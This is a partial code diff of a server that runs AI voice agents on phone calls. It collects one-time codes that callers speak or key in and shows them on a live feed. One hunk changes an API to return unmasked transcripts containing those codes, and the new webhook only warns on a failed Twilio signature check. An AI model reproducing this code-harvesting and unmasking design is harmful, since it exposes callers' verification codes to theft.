+  if (!callSid || callEndLocks.has(callSid)) {
+    return;
+  }
+  callEndLocks.set(callSid, true);
+  clearSilenceTimer(callSid);
+  digitCollectionManager.expectations.delete(callSid);
+  clearDigitTimeout(callSid);
+  clearDigitFallbackState(callSid);
+  clearDigitPlan(callSid);
+
+  const text = message || 'Thank you for your time. Goodbye.';
+  const callConfig = callConfigurations.get(callSid);
+  const provider = callConfig?.provider || currentProvider;
+  const session = activeCalls.get(callSid);
+  if (session) {
+    session.ending = true;
+  }
+
+  webhookService.addLiveEvent(callSid, `👋 Ending call (${reason})`, { force: true });
+  webhookService.setLiveCallPhase(callSid, 'ending').catch(() => {});
+
+  try {
+    await db.addTranscript({
+      call_sid: callSid,
+      speaker: 'ai',
+      message: text,
+      interaction_count: session?.interactionCount || 0,
+      personality_used: 'closing'
+    });
+    webhookService.recordTranscriptTurn(callSid, 'agent', text);
+  } catch (dbError) {
+    console.error('Database error adding closing transcript:', dbError);
+  }
+
+  try {
+    await db.updateCallState(callSid, 'call_ending', {
+      reason,
+      message: text
+    });
+  } catch (stateError) {
+    console.error('Database error logging call ending:', stateError);
+  }
+
+  const delayMs = estimateSpeechDurationMs(text);
+
+  if (provider === 'aws') {
+    try {
+      const ttsAdapter = getAwsTtsAdapter();
+      const { key } = await ttsAdapter.synthesizeToS3(text);
+      const contactId = callConfig?.provider_metadata?.contact_id;
+      if (contactId) {
+        const awsAdapter = getAwsConnectAdapter();
+        await awsAdapter.enqueueAudioPlayback({ contactId, audioKey: key });
+      }
+    } catch (ttsError) {
+      console.error('AWS closing TTS error:', ttsError);
+    }
+    setTimeout(() => {
+      endCallForProvider(callSid).catch((err) => console.error('End call error:', err));
+    }, delayMs);
+    return;
+  }
+
+  if (provider === 'twilio' && !session?.ttsService) {
+    try {
+      const accountSid = config.twilio.accountSid;
+      const authToken = config.twilio.authToken;
+      if (accountSid && authToken) {
+        const response = new VoiceResponse();
+        response.say(text);
+        response.hangup();
+        const client = twilio(accountSid, authToken);
+        await client.calls(callSid).update({ twiml: response.toString() });
+        return;
+      }
+    } catch (twilioError) {
+      console.error('Twilio closing update error:', twilioError);
+    }
+  }
+
+  if (session?.ttsService) {
+    try {
+      await session.ttsService.generate({ partialResponseIndex: null, partialResponse: text }, session?.interactionCount || 0);
+    } catch (ttsError) {
+      console.error('Closing TTS error:', ttsError);
+    }
+  }
+
+  setTimeout(() => {
+    endCallForProvider(callSid).catch((err) => console.error('End call error:', err));
+  }, delayMs);
+}
+
 async function recordCallStatus(callSid, status, notificationType, extra = {}) {
   if (!callSid) return;
   await db.updateCallStatus(callSid, status, extra);
@@ -887,6 +1494,9 @@ async function ensureAwsSession(callSid) {
   };
 
   gptService.on('gptreply', async (gptReply, icount) => {
+    if (session?.ending) {
+      return;
+    }
     const personalityInfo = gptReply.personalityInfo || {};
 
     webhookService.recordTranscriptTurn(callSid, 'agent', gptReply.partialResponse);
@@ -922,6 +1532,7 @@ async function ensureAwsSession(callSid) {
           audioKey: key
         });
         webhookService.setLiveCallPhase(callSid, 'agent_speaking').catch(() => {});
+        scheduleSilenceTimer(callSid);
       }
     } catch (ttsError) {
       console.error('AWS TTS playback error:', ttsError);
@@ -935,15 +1546,16 @@ async function ensureAwsSession(callSid) {
     const ttsAdapter = getAwsTtsAdapter();
     const { key } = await ttsAdapter.synthesizeToS3(firstMessage);
     const contactId = callConfig?.provider_metadata?.contact_id;
-    if (contactId) {
-      const awsAdapter = getAwsConnectAdapter();
-      await awsAdapter.enqueueAudioPlayback({
-        contactId,
-        audioKey: key
-      });
-      webhookService.recordTranscriptTurn(callSid, 'agent', firstMessage);
-      webhookService.setLiveCallPhase(callSid, 'agent_speaking').catch(() => {});
-    }
+      if (contactId) {
+        const awsAdapter = getAwsConnectAdapter();
+        await awsAdapter.enqueueAudioPlayback({
+          contactId,
+          audioKey: key
+        });
+        webhookService.recordTranscriptTurn(callSid, 'agent', firstMessage);
+        webhookService.setLiveCallPhase(callSid, 'agent_speaking').catch(() => {});
+        scheduleSilenceTimer(callSid);
+      }
   } catch (error) {
     console.error('AWS first message playback error:', error);
   }
@@ -1069,6 +1681,10 @@ app.ws('/connection', (ws) => {
 
           // Set up GPT reply handler with personality tracking
           gptService.on('gptreply', async (gptReply, icount) => {
+            const activeSession = activeCalls.get(callSid);
+            if (activeSession?.ending) {
+              return;
+            }
             const personalityInfo = gptReply.personalityInfo || {};
             console.log(`${personalityInfo.name || 'Default'} Personality: ${gptReply.partialResponse.substring(0, 50)}...`);
             webhookService.recordTranscriptTurn(callSid, 'agent', gptReply.partialResponse);
@@ -1095,6 +1711,7 @@ app.ws('/connection', (ws) => {
             }
             
             ttsService.generate(gptReply, icount);
+            scheduleSilenceTimer(callSid);
           });
 
           gptService.on('stall', (fillerText) => {
@@ -1111,23 +1728,7 @@ app.ws('/connection', (ws) => {
             const message = err?.message || 'GPT error';
             webhookService.addLiveEvent(callSid, `⚠️ GPT error: ${message}`, { force: true });
             if (gptErrorCount >= 2) {
-              const fallback = { partialResponseIndex: null, partialResponse: 'I am having trouble right now • I will reconnect you or end the call. Thank you.' };
-              try {
-                await db.addTranscript({
-                  call_sid: callSid,
-                  speaker: 'ai',
-                  message: fallback.partialResponse,
-                  interaction_count: interactionCount,
-                  personality_used: 'fallback'
-                });
-              } catch (dbError) {
-                console.error('Database error adding fallback transcript:', dbError);
-              }
-              try {
-                await ttsService.generate(fallback, interactionCount);
-              } catch (ttsErr) {
-                console.error('Fallback TTS error:', ttsErr);
-              }
+              await speakAndEndCall(callSid, CALL_END_MESSAGES.error, 'gpt_error');
             }
           });
 
@@ -1155,7 +1756,9 @@ app.ws('/connection', (ws) => {
             gptService,
             callConfig,
             functionSystem,
-            personalityChanges: []
+            personalityChanges: [],
+            ttsService,
+            interactionCount: 0
           });
 
           // Initialize call with recording
@@ -1184,6 +1787,7 @@ app.ws('/connection', (ws) => {
               partialResponseIndex: null, 
               partialResponse: firstMessage
             }, 0);
+            scheduleSilenceTimer(callSid);
             
             isInitialized = true;
             console.log('Adaptive call initialization complete');
@@ -1211,6 +1815,7 @@ app.ws('/connection', (ws) => {
               partialResponseIndex: null, 
               partialResponse: firstMessage
             }, 0);
+            scheduleSilenceTimer(callSid);
             
             isInitialized = true;
           }
@@ -1234,14 +1839,11 @@ app.ws('/connection', (ws) => {
         } else if (event === 'dtmf') {
           const digits = msg?.dtmf?.digits || msg?.dtmf?.digit || '';
           if (digits) {
+            clearSilenceTimer(callSid);
             webhookService.addLiveEvent(callSid, `🔢 Keypad: ${digits}`, { force: true });
             const collection = digitCollectionManager.recordDigits(callSid, digits);
-            if (collection?.reason === 'incomplete') {
-              scheduleDigitTimeout(callSid, gptService, interactionCount + 1);
-              return;
-            }
-            await handleCollectionResult(callSid, collection, gptService, interactionCount);
-            if (collection.accepted && collection.route) {
+            await handleCollectionResult(callSid, collection, gptService, interactionCount, 'dtmf');
+            if (collection.accepted && collection.route && !callEndLocks.has(callSid)) {
               webhookService.addLiveEvent(callSid, `➡️ Routing via menu: ${collection.route}`, { force: true });
               await db.updateCallState(callSid, 'route_requested', { reason: collection.route, via: 'menu' }).catch(() => {});
             }
@@ -1258,6 +1860,10 @@ app.ws('/connection', (ws) => {
             callFunctionSystems.delete(callSid);
             console.log(`Cleaned up adaptive configuration for call: ${callSid}`);
           }
+          clearDigitFallbackState(callSid);
+          clearDigitPlan(callSid);
+          clearCallEndLock(callSid);
+          clearSilenceTimer(callSid);
         } else {
           console.log(`Unrecognized WS event for ${callSid || 'unknown'}: ${event || 'none'}`, msg);
         }
@@ -1267,6 +1873,7 @@ app.ws('/connection', (ws) => {
     });
   
     transcriptionService.on('utterance', async (text) => {
+      clearSilenceTimer(callSid);
       if (text && text.trim().length > 0) {
         webhookService.setLiveCallPhase(callSid, 'user_speaking').catch(() => {});
       }
@@ -1285,6 +1892,7 @@ app.ws('/connection', (ws) => {
       if (!text || !gptService || !isInitialized) { 
         return; 
       }
+      clearSilenceTimer(callSid);
 
       const otpContext = getOtpContext(text, callSid);
       console.log(`Customer: ${otpContext.maskedForLogs}`);
@@ -1313,17 +1921,26 @@ app.ws('/connection', (ws) => {
       if (otpContext.codes && otpContext.codes.length) {
         webhookService.addLiveEvent(callSid, `🔢 Code entered: ${otpContext.codes.join(', ')}`, { force: true });
         const collection = digitCollectionManager.recordDigits(callSid, otpContext.codes[otpContext.codes.length - 1]);
-        await handleCollectionResult(callSid, collection, gptService, interactionCount);
+        await handleCollectionResult(callSid, collection, gptService, interactionCount, 'spoken');
       }
 
       if (!otpContext.maskedForGpt || !otpContext.maskedForGpt.trim()) {
         interactionCount += 1;
+        const session = activeCalls.get(callSid);
+        if (session) {
+          session.interactionCount = interactionCount;
+        }
         return;
       }
 
       if (shouldCloseConversation(otpContext.maskedForGpt) && interactionCount >= 1) {
-        gptService.updateUserContext('closing_hint', 'system', 'User indicated thanks/closing. Provide a brief, polite closing and end the call without asking more questions.');
-        gptService.setPhase('closing');
+        await speakAndEndCall(callSid, CALL_END_MESSAGES.user_goodbye, 'user_goodbye');
+        interactionCount += 1;
+        const session = activeCalls.get(callSid);
+        if (session) {
+          session.interactionCount = interactionCount;
+        }
+        return;
       }
       
       // Process with adaptive personality and functions
@@ -1334,6 +1951,10 @@ app.ws('/connection', (ws) => {
         webhookService.addLiveEvent(callSid, '⚠️ GPT error, retrying', { force: true });
       }
       interactionCount += 1;
+      const session = activeCalls.get(callSid);
+      if (session) {
+        session.interactionCount = interactionCount;
+      }
     });
     
     ttsService.on('speech', (responseIndex, audio, label, icount) => {
@@ -1348,6 +1969,9 @@ app.ws('/connection', (ws) => {
     ws.on('close', () => {
       console.log(`WebSocket connection closed for adaptive call: ${callSid || 'unknown'}`);
       clearDigitTimeout(callSid);
+      clearDigitPlan(callSid);
+      clearCallEndLock(callSid);
+      clearSilenceTimer(callSid);
     });
 
   } catch (err) {
@@ -1401,10 +2025,16 @@ app.ws('/vonage/stream', (ws, req) => {
       callConfig,
       functionSystem,
       personalityChanges: [],
-      ws
+      ws,
+      ttsService,
+      interactionCount: 0
     });
 
     gptService.on('gptreply', async (gptReply, icount) => {
+      const activeSession = activeCalls.get(callSid);
+      if (activeSession?.ending) {
+        return;
+      }
       webhookService.recordTranscriptTurn(callSid, 'agent', gptReply.partialResponse);
       webhookService.setLiveCallPhase(callSid, 'agent_responding').catch(() => {});
       try {
@@ -1425,6 +2055,7 @@ app.ws('/vonage/stream', (ws, req) => {
       }
 
       await ttsService.generate(gptReply, icount);
+      scheduleSilenceTimer(callSid);
     });
 
     gptService.on('stall', (fillerText) => {
@@ -1441,12 +2072,7 @@ app.ws('/vonage/stream', (ws, req) => {
       const message = err?.message || 'GPT error';
       webhookService.addLiveEvent(callSid, `⚠️ GPT error: ${message}`, { force: true });
       if (gptErrorCount >= 2) {
-        const fallback = { partialResponseIndex: null, partialResponse: 'I am having trouble right now • I will reconnect you or end the call. Thank you.' };
-        try {
-          await ttsService.generate(fallback, interactionCount);
-        } catch (ttsErr) {
-          console.error('Fallback TTS error:', ttsErr);
-        }
+        await speakAndEndCall(callSid, CALL_END_MESSAGES.error, 'gpt_error');
       }
     });
 
@@ -1461,6 +2087,7 @@ app.ws('/vonage/stream', (ws, req) => {
     });
 
     transcriptionService.on('utterance', (text) => {
+      clearSilenceTimer(callSid);
       if (text && text.trim().length > 0) {
         webhookService.setLiveCallPhase(callSid, 'user_speaking').catch(() => {});
       }
@@ -1468,6 +2095,7 @@ app.ws('/vonage/stream', (ws, req) => {
 
     transcriptionService.on('transcription', async (text) => {
       if (!text) return;
+      clearSilenceTimer(callSid);
       const otpContext = getOtpContext(text, callSid);
       try {
         await db.addTranscript({
@@ -1490,15 +2118,24 @@ app.ws('/vonage/stream', (ws, req) => {
       if (otpContext.codes && otpContext.codes.length) {
         webhookService.addLiveEvent(callSid, `🔢 Code entered: ${otpContext.codes.join(', ')}`, { force: true });
         const collection = digitCollectionManager.recordDigits(callSid, otpContext.codes[otpContext.codes.length - 1]);
-        await handleCollectionResult(callSid, collection, gptService, interactionCount);
+        await handleCollectionResult(callSid, collection, gptService, interactionCount, 'spoken');
       }
       if (!otpContext.maskedForGpt || !otpContext.maskedForGpt.trim()) {
         interactionCount += 1;
+        const session = activeCalls.get(callSid);
+        if (session) {
+          session.interactionCount = interactionCount;
+        }
         return;
       }
       if (shouldCloseConversation(otpContext.maskedForGpt) && interactionCount >= 1) {
-        gptService.updateUserContext('closing_hint', 'system', 'User indicated thanks/closing. Provide a brief, polite closing and end the call without asking more questions.');
-        gptService.setPhase('closing');
+        await speakAndEndCall(callSid, CALL_END_MESSAGES.user_goodbye, 'user_goodbye');
+        interactionCount += 1;
+        const session = activeCalls.get(callSid);
+        if (session) {
+          session.interactionCount = interactionCount;
+        }
+        return;
       }
       try {
         await gptService.completion(otpContext.maskedForGpt, interactionCount);
@@ -1507,6 +2144,10 @@ app.ws('/vonage/stream', (ws, req) => {
         webhookService.addLiveEvent(callSid, '⚠️ GPT error, retrying', { force: true });
       }
       interactionCount += 1;
+      const session = activeCalls.get(callSid);
+      if (session) {
+        session.interactionCount = interactionCount;
+      }
     });
 
     ws.on('message', (data) => {
@@ -1533,12 +2174,17 @@ app.ws('/vonage/stream', (ws, req) => {
       }
       activeCalls.delete(callSid);
       clearDigitTimeout(callSid);
+      clearDigitFallbackState(callSid);
+      clearDigitPlan(callSid);
+      clearCallEndLock(callSid);
+      clearSilenceTimer(callSid);
     });
 
     // Send first message once stream is ready
     if (callConfig?.first_message) {
       ttsService.generate({ partialResponseIndex: null, partialResponse: callConfig.first_message }, 0);
       webhookService.recordTranscriptTurn(callSid, 'agent', callConfig.first_message);
+      scheduleSilenceTimer(callSid);
     }
   } catch (error) {
     console.error('Vonage websocket error:', error);
@@ -1582,6 +2228,7 @@ app.ws('/aws/stream', (ws, req) => {
     let interactionCount = 0;
 
     transcriptionService.on('utterance', (text) => {
+      clearSilenceTimer(callSid);
       if (text && text.trim().length > 0) {
         webhookService.setLiveCallPhase(callSid, 'user_speaking').catch(() => {});
       }
@@ -1589,6 +2236,7 @@ app.ws('/aws/stream', (ws, req) => {
 
     transcriptionService.on('transcription', async (text) => {
       if (!text) return;
+      clearSilenceTimer(callSid);
       const session = await sessionPromise;
       const otpContext = getOtpContext(text, callSid);
       try {
@@ -1613,16 +2261,20 @@ app.ws('/aws/stream', (ws, req) => {
       if (otpContext.codes && otpContext.codes.length) {
         webhookService.addLiveEvent(callSid, `🔢 Code entered: ${otpContext.codes.join(', ')}`, { force: true });
         const collection = digitCollectionManager.recordDigits(callSid, otpContext.codes[otpContext.codes.length - 1]);
-        if (collection.accepted && collection.route) {
+        if (collection.accepted && collection.route && !callEndLocks.has(callSid)) {
           webhookService.addLiveEvent(callSid, `➡️ Routing via menu: ${collection.route}`, { force: true });
           await db.updateCallState(callSid, 'route_requested', { reason: collection.route, via: 'menu' }).catch(() => {});
         }
-        await handleCollectionResult(callSid, collection, session.gptService, interactionCount);
+        await handleCollectionResult(callSid, collection, session.gptService, interactionCount, 'spoken');
       }
 
       if (shouldCloseConversation(otpContext.maskedForGpt) && interactionCount >= 1) {
-        session.gptService.updateUserContext('closing_hint', 'system', 'User indicated thanks/closing. Provide a brief, polite closing and end the call without asking more questions.');
-        session.gptService.setPhase('closing');
+        await speakAndEndCall(callSid, CALL_END_MESSAGES.user_goodbye, 'user_goodbye');
+        interactionCount += 1;
+        if (session) {
+          session.interactionCount = interactionCount;
+        }
+        return;
       }
 
       try {
@@ -1632,6 +2284,9 @@ app.ws('/aws/stream', (ws, req) => {
         webhookService.addLiveEvent(callSid, '⚠️ GPT error, retrying', { force: true });
       }
       interactionCount += 1;
+      if (session) {
+        session.interactionCount = interactionCount;
+      }
     });
 
     ws.on('message', (data) => {
@@ -1657,6 +2312,10 @@ app.ws('/aws/stream', (ws, req) => {
         await handleCallEnd(callSid, session.startTime);
       }
       activeCalls.delete(callSid);
+      clearDigitFallbackState(callSid);
+      clearDigitPlan(callSid);
+      clearCallEndLock(callSid);
+      clearSilenceTimer(callSid);
     });
 
     recordCallStatus(callSid, 'in-progress', 'call_in_progress').catch(() => {});
@@ -1673,13 +2332,21 @@ async function handleCallEnd(callSid, callStartTime) {
     const duration = Math.round((callEndTime - callStartTime) / 1000);
     digitCollectionManager.expectations.delete(callSid);
     clearDigitTimeout(callSid);
+    clearDigitFallbackState(callSid);
+    clearDigitPlan(callSid);
+    clearCallEndLock(callSid);
+    clearSilenceTimer(callSid);
+    clearDigitPlan(callSid);
 
     const transcripts = await db.getCallTranscripts(callSid);
+    const fullTranscripts = transcripts || [];
     const maskedTranscripts = transcripts.map((entry) => ({
       ...entry,
       message: maskOtpForExternal(entry.message)
     }));
     const summary = generateCallSummary(transcripts, duration);
+    const digitEvents = await db.getCallDigits(callSid).catch(() => []);
+    const digitSummary = buildDigitSummary(digitEvents);
     
     // Get personality adaptation data
     const callSession = activeCalls.get(callSid);
@@ -1699,7 +2366,9 @@ async function handleCallEnd(callSid, callStartTime) {
       ended_at: callEndTime.toISOString(),
       duration: duration,
       call_summary: summary.summary,
-      ai_analysis: JSON.stringify({...summary.analysis, adaptation: adaptationAnalysis})
+      ai_analysis: JSON.stringify({...summary.analysis, adaptation: adaptationAnalysis}),
+      digit_summary: digitSummary.summary,
+      digit_count: digitSummary.count
     });
 
     await db.updateCallState(callSid, 'call_ended', {
@@ -2037,6 +2706,7 @@ app.post('/aws/transcripts', async (req, res) => {
       return res.status(200).json({ success: true });
     }
     const session = await ensureAwsSession(callSid);
+    clearSilenceTimer(callSid);
     await db.addTranscript({
       call_sid: callSid,
       speaker: 'user',
@@ -2047,6 +2717,11 @@ app.post('/aws/transcripts', async (req, res) => {
       message: transcript,
       interaction_count: session.interactionCount
     });
+    if (shouldCloseConversation(transcript) && session.interactionCount >= 1) {
+      await speakAndEndCall(callSid, CALL_END_MESSAGES.user_goodbye, 'user_goodbye');
+      session.interactionCount += 1;
+      return res.status(200).json({ success: true });
+    }
     session.gptService.completion(transcript, session.interactionCount);
     session.interactionCount += 1;
     res.status(200).json({ success: true });
@@ -2646,8 +3321,8 @@ app.get('/api/calls/:callSid', async (req, res) => {
     
     res.json({
       call,
-      transcripts: maskedTranscripts,
-      transcript_count: maskedTranscripts.length,
+      transcripts: fullTranscripts,
+      transcript_count: fullTranscripts.length,
       adaptation_analytics: adaptationData,
       business_context: call.business_context ? JSON.parse(call.business_context) : null,
       webhook_notifications: webhookNotifications,
@@ -3510,6 +4185,83 @@ app.post('/webhook/sms-status', async (req, res) => {
         console.error('SMS status webhook error:', error);
         res.status(500).send('OK'); // Return OK to prevent retries
     }
+});
+
+// Twilio Gather fallback handler (DTMF)
+app.post('/webhook/twilio-gather', async (req, res) => {
+  try {
+    warnOnInvalidTwilioSignature(req, '/webhook/twilio-gather');
+    const { CallSid, Digits } = req.body || {};
+    const callSid = req.query?.callSid || CallSid;
+    if (!callSid) {
+      return res.status(400).send('Missing CallSid');
+    }
+
+    const expectation = digitCollectionManager.expectations.get(callSid) || {
+      min_digits: 1,
+      max_digits: 6,
+      timeout_s: 10,
+      max_retries: 2,
+      prompt: 'Please enter the code now.'
+    };
+
+    const digits = String(Digits || '').trim();
+    if (digits) {
+      webhookService.addLiveEvent(callSid, `🔢 Keypad (Gather): ${digits}`, { force: true });
+      const collection = digitCollectionManager.recordDigits(callSid, digits);
+      await handleCollectionResult(callSid, collection, null, 0, 'gather', { allowCallEnd: false });
+
+      if (collection.accepted) {
+        const nextExpectation = digitCollectionManager.expectations.get(callSid);
+        if (nextExpectation?.plan_id) {
+          const prompt = `Thanks. ${buildDigitPrompt(nextExpectation)}`;
+          const twiml = buildTwilioGatherTwiml(callSid, nextExpectation, { prompt });
+          res.type('text/xml');
+          res.end(twiml);
+          return;
+        }
+      }
+
+      const response = new VoiceResponse();
+      if (collection.accepted) {
+        response.say(CALL_END_MESSAGES.success);
+        response.hangup();
+      } else if (collection.fallback) {
+        response.say(CALL_END_MESSAGES.failure);
+        response.hangup();
+      } else {
+        response.say('That did not go through. Please try again.');
+        response.connect().stream({ url: `wss://${config.server.hostname}/connection`, track: 'both_tracks' });
+      }
+      clearDigitFallbackState(callSid);
+      res.type('text/xml');
+      res.end(response.toString());
+      return;
+    }
+
+    expectation.retries = (expectation.retries || 0) + 1;
+    digitCollectionManager.expectations.set(callSid, expectation);
+
+    if (expectation.retries > expectation.max_retries) {
+      const response = new VoiceResponse();
+      response.say(CALL_END_MESSAGES.no_response);
+      response.hangup();
+      clearDigitFallbackState(callSid);
+      clearDigitPlan(callSid);
+      res.type('text/xml');
+      res.end(response.toString());
+      return;
+    }
+
+    const twiml = buildTwilioGatherTwiml(callSid, expectation, {
+      prompt: 'I did not receive any input. Please enter the code using your keypad.'
+    });
+    res.type('text/xml');
+    res.end(twiml);
+  } catch (error) {
+    console.error('Twilio gather webhook error:', error);
+    res.status(500).send('Error');
+  }
 });
 
 // Send single SMS endpoint
